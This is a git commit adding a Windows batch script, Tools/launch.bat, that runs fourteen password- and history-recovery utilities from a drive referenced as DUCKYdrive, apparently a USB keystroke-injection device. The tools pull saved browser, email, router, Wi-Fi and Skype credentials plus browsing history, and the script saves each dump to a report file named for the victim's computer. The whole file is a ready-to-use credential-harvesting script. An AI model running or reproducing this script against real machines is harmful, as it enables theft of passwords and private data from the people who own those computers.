56218383cf220d5fc95e2238729559b1a075de60
Erwin <erwin@helemaaldol.nl>
2016-05-22 13:45:56 +0200

    Initial commit

---
+++ Tools/launch.bat
@@ -0,0 +1,15 @@
+start %DUCKYdrive%\WebBrowserPassView.exe /stext %DUCKYdrive%\Reports\WebBrowserPassView-%computername%.txt
+start %DUCKYdrive%\SkypeLogView.exe /stext %DUCKYdrive%\Reports\SkypeLogView-%computername%.txt
+start %DUCKYdrive%\RouterPassView.exe /stext %DUCKYdrive%\Reports\RouterPassView-%computername%.txt
+start %DUCKYdrive%\pspv.exe /stext %DUCKYdrive%\Reports\pspv-%computername%.txt
+start %DUCKYdrive%\PasswordFox.exe /stext %DUCKYdrive%\Reports\PasswordFox-%computername%.txt
+start %DUCKYdrive%\OperaPassView.exe /stext %DUCKYdrive%\Reports\OperaPassView-%computername%.txt
+start %DUCKYdrive%\mspass.exe /stext %DUCKYdrive%\Reports\mspass-%computername%.txt
+start %DUCKYdrive%\mailpv.exe /stext %DUCKYdrive%\Reports\mailpv-%computername%.txt
+start %DUCKYdrive%\iepv.exe /stext %DUCKYdrive%\Reports\iepv-%computername%.txt
+start %DUCKYdrive%\ChromePass.exe /stext %DUCKYdrive%\Reports\ChromePass-%computername%.txt
+start %DUCKYdrive%\ChromeHistoryView.exe /stext %DUCKYdrive%\Reports\ChromeHistoryView-%computername%.txt
+start %DUCKYdrive%\BulletsPassView.exe /stext %DUCKYdrive%\Reports\BulletsPassView-%computername%.txt
+start %DUCKYdrive%\BrowsingHistoryView.exe /stext %DUCKYdrive%\Reports\BrowsingHistoryView-%computername%.txt
+start %DUCKYdrive%\WirelessKeyView.exe /stext %DUCKYdrive%\Reports\WirelessKeyView-%computername%.txt
+exit
